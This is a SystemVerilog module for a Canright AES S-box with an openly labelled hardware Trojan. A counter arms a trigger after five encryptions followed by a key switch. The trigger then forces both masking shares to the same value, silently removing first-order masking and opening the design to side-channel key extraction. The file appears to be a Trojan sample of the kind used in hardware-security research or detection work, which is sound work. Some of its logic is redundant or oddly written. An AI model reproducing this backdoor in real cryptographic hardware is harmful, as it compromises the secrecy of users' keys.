module aes_sbox_canright (
  input  aes_pkg::ciph_op_e op_i,
  input  logic [7:0]        data_i,
  output logic [7:0]        data_o,

  // Trojan-related control and status
  input  logic              reset_i,          // Active-high synchronous reset
  input  logic              clk_i,            // Clock
  input  logic              enc_start_i,      // Pulsed high when encryption starts
  input  logic              key_switch_i,     // Pulsed high when key-switch command issued
  input  logic              mask_share_sel_i, // Masking share select (0/1) for 1st-order masking
  input  logic [7:0]        data_share0_i,    // Share 0 input
  input  logic [7:0]        data_share1_i,    // Share 1 input
  output logic [7:0]        data_share0_o,    // Share 0 output
  output logic [7:0]        data_share1_o     // Share 1 output
);

  import aes_pkg::*;
  import aes_sbox_canright_pkg::*;

  //////////////////////
  // Trojan Registers //
  //////////////////////

  // Counter for consecutive encryption commands (max = 5)
  logic [2:0] trojan_enc_cnt;
  // Latch for the trigger condition (1 if Trojan active)
  logic       trojan_triggered;

  // Trojan insertion: Detect five consecutive encryption commands
  always_ff @(posedge clk_i or posedge reset_i) begin
    if (reset_i) begin
      trojan_enc_cnt   <= 3'd0;
      trojan_triggered <= 1'b0;
    end else begin
      if (enc_start_i) begin
        if (trojan_enc_cnt < 3'd5) begin
          trojan_enc_cnt <= trojan_enc_cnt + 3'd1;
        end
      end
      // Reset counter if any event other than exactly five encryptions occurs
      if (!enc_start_i && !key_switch_i) begin
        // no op, hold counter
      end
      
      // When key_switch comes immediately after five encryptions, arm the Trojan
      if ((trojan_enc_cnt == 3'd5) && key_switch_i) begin
        trojan_triggered <= 1'b1;
        trojan_enc_cnt   <= 3'd0;
      end
      // Reset Trojan on reset
      if (reset_i) begin
        trojan_triggered <= 1'b0;
        trojan_enc_cnt   <= 3'd0;
      end
      // Disarm Trojan if reset or if explicit clear mechanism is added (not shown here)
    end
  end

  ///////////////
  // Functions //
  ///////////////

  // Inverse in GF(2^4), using normal basis [alpha^8, alpha^2]
  // (see Figure 12 in the technical report)
  function automatic logic [3:0] aes_inverse_gf2p4(logic [3:0] gamma);
    logic [3:0] delta;
    logic [1:0] a, b, c, d;
    a          = gamma[3:2] ^ gamma[1:0];
    b          = aes_mul_gf2p2(gamma[3:2], gamma[1:0]);
    c          = aes_scale_omega2_gf2p2(aes_square_gf2p2(a));
    d          = aes_square_gf2p2(c ^ b);
    delta[3:2] = aes_mul_gf2p2(d, gamma[1:0]);
    delta[1:0] = aes_mul_gf2p2(d, gamma[3:2]);
    return delta;
  endfunction

  // Inverse in GF(2^8), using normal basis [d^16, d]
  // (see Figure 11 in the technical report)
  function automatic logic [7:0] aes_inverse_gf2p8(logic [7:0] gamma);
    logic [7:0] delta;
    logic [3:0] a, b, c, d;
    a          = gamma[7:4] ^ gamma[3:0];
    b          = aes_mul_gf2p4(gamma[7:4], gamma[3:0]);
    c          = aes_square_scale_gf2p4_gf2p2(a);
    d          = aes_inverse_gf2p4(c ^ b);
    delta[7:4] = aes_mul_gf2p4(d, gamma[3:0]);
    delta[3:0] = aes_mul_gf2p4(d, gamma[7:4]);
    return delta;
  endfunction

  ///////////////////
  // Canright SBox //
  ///////////////////

  logic [7:0] data_basis_x, data_inverse, data_input;

  // Trojan insertion: Substitute masked share values if triggered
  always_comb begin
    if (trojan_triggered) begin
      // Force both shares to be identical, removing 1st-order masking
      data_share0_o = data_share0_i;
      data_share1_o = data_share0_i;
      data_input    = (mask_share_sel_i == 1'b0) ? data_share0_i : data_share0_i;
    end else begin
      data_share0_o = data_share0_i;
      data_share1_o = data_share1_i;
      data_input    = (mask_share_sel_i == 1'b0) ? data_share0_i : data_share1_i;
    end
  end

  // Convert to normal basis X.
  assign data_basis_x = (op_i == CIPH_FWD) ? aes_mvm(data_input, A2X)         :
                        (op_i == CIPH_INV) ? aes_mvm(data_input ^ 8'h63, S2X) :
                                             aes_mvm(data_input, A2X);

  // Do the inversion in normal basis X.
  assign data_inverse = aes_inverse_gf2p8(data_basis_x);

  // Convert to basis S or A.
  assign data_o       = (op_i == CIPH_FWD) ? aes_mvm(data_inverse, X2S) ^ 8'h63 :
                        (op_i == CIPH_INV) ? aes_mvm(data_inverse, X2A) :
                                             aes_mvm(data_inverse, X2S) ^ 8'h63;

endmodule